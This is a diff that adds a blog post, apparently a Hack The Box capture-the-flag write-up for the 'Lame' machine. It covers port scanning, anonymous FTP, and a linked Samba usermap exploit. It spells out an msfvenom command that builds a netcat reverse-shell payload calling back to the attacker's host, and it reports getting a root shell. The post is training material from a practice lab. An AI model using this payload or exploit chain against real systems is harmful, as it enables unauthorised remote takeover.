@@ -1,0 +1,88 @@
+I"@<h1 id="introductionlame">Introduction@Lame:~$</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Column</th>
+      <th>Details</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Name</td>
+      <td>Lame</td>
+    </tr>
+    <tr>
+      <td>IP</td>
+      <td>10.10.10.3</td>
+    </tr>
+    <tr>
+      <td>Points</td>
+      <td>20</td>
+    </tr>
+    <tr>
+      <td>Os</td>
+      <td>Linux</td>
+    </tr>
+    <tr>
+      <td>Difficult</td>
+      <td>Easy</td>
+    </tr>
+    <tr>
+      <td>Creator</td>
+      <td><a href="https://www.hackthebox.eu/home/users/profile/1">ch4p</a></td>
+    </tr>
+    <tr>
+      <td>Out on</td>
+      <td>26th May 2017</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="summary">Summary:~$</h1>
+
+<ul>
+  <li>Discovering the new host and scanning for open ports.</li>
+  <li><code class="language-plaintext highlighter-rouge">Anonymous ftp</code> is allowed, but of no use.</li>
+  <li>Found <code class="language-plaintext highlighter-rouge">samba exploit</code> for the version running on the machine.</li>
+  <li>Got Root directly.</li>
+</ul>
+
+<h1 id="starting">Starting:~$</h1>
+
+<h2 id="nmap">Nmap</h2>
+
+<p>I have used <strong>nmapAutomator</strong> , which keeps the scanning fast and reduces effort.<em>(Not recommended in real life scenarios).</em></p>
+
+<p>Dowload link: <a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a></p>
+
+<hr />
+<p><img src="/assets/img/lame-hackthebox/nmap-scan-1.png" alt="" /></p>
+
+<p>From a <code class="language-plaintext highlighter-rouge">quick scan</code> we know that <code class="language-plaintext highlighter-rouge">4 Ports</code> are open i.e. <code class="language-plaintext highlighter-rouge">21,22,139,445</code>. Let’s access port 21 <code class="language-plaintext highlighter-rouge">ftp</code> for anonymous logins.</p>
+
+<hr />
+<p><img src="/assets/img/lame-hackthebox/ftp-login-2.png" alt="" /></p>
+
+<p>But it’s of no use as the directories are <code class="language-plaintext highlighter-rouge">empty</code>.</p>
+
+<p>I googled a bit about the <code class="language-plaintext highlighter-rouge">smb</code> version running and found this <a href="https://gist.githubusercontent.com/joenorton8014/19aaa00e0088738fc429cff2669b9851/raw/6e1ae37e0061be103fd733b16266d26379a7f4ba/samba-usermap-exploit.py">exploit</a></p>
+
+<p>Making changes in the <em>exploit</em> by replacing it with our <code class="language-plaintext highlighter-rouge">msfvenom payload</code>.</p>
+
+<p><strong>msfvenom command</strong> : <em>msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.X.X LPORT=9999 -f python</em></p>
+
+<hr />
+<p><img src="/assets/img/lame-hackthebox/changing the payload-4.png" alt="" /></p>
+
+<p>This is what the final exploit looks like: (<em>changing the payload with our payload</em>)</p>
+
+<hr />
+<p><img src="/assets/img/lame-hackthebox/my-final-exploit-6.png" alt="" /></p>
+
+<p>Running the exploit and listeing on specified port using <code class="language-plaintext highlighter-rouge">nc</code>, we got the <code class="language-plaintext highlighter-rouge">Root shell</code>.</p>
+
+<hr />
+<p><img src="/assets/img/lame-hackthebox/got-root-shell-7.png" alt="" /></p>
+
+:ET
